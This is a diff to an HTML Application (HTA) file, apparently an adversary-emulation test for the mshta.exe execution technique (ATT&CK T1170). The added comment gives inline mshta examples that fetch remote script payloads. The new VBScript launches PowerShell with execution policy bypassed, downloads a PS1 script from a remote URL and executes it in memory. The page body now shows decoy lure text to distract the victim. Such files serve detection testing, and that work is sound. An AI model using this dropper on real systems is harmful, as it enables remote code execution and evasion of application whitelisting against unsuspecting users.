@@ -1,13 +1,28 @@
+<!--
+T1170 Mshta
+TACTIC: Defense Evasion, Execution
+ATT&CK DESCRIPTION:
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.
+Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code
+Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
+They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta
+Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings
+
+TEST CASE 1: 
+Use .HTA to download a PS1 payload and execute
+-->
 <html>
 <head>
 <HTA:APPLICATION ID="AtomicRedTeam">
-<script language="jscript">
-        //var c = "cmd.exe /c calc.exe"; 
-		var c = "cmd.exe /c PowerShell.exe -ExecutionPolicy Bypass -File %TMP%\\SCRIPTPAYLOAD.ps1 & pause"
-        new ActiveXObject('WScript.Shell').Run(c);
+
+<script language="VBScript">
+	Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "cmd.exe /c PowerShell.exe -ExecutionPolicy Bypass -Command $Wcl = new-object System.Net.WebClient; $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; iex ($Wcl.DownloadString('https://github.com/ScRdTm/AttackTests/raw/master/PAYLOADS/SCRIPTPAYLOAD.ps1'))"
 </script>
 </head>
 <body>
-<script>self.close();</script>
+<H1>The Fake Content to Distract You!</H1>
+<P>Yes, this is the content I lured you into looking at, meanwhile you are getting pwnd!</P>
+<P>Just close the window when you're done.  Have a nice day</P>
 </body>
 </html>
